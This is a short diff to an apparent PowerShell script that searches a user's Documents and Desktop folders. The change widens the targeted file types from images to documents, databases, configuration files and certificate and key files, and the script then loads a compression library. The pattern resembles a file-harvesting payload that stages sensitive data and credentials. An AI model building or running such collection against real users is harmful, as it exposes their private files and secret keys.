@@ -21,7 +21,7 @@ $foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$e
 If($FileType -ne $null){
 $fileExtensions = "*."+$FileType
 }else {
-$fileExtensions = @("*.jpg", "*.jpeg")
+$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
 }
 
 Add-Type -AssemblyName System.IO.Compression.FileSystem
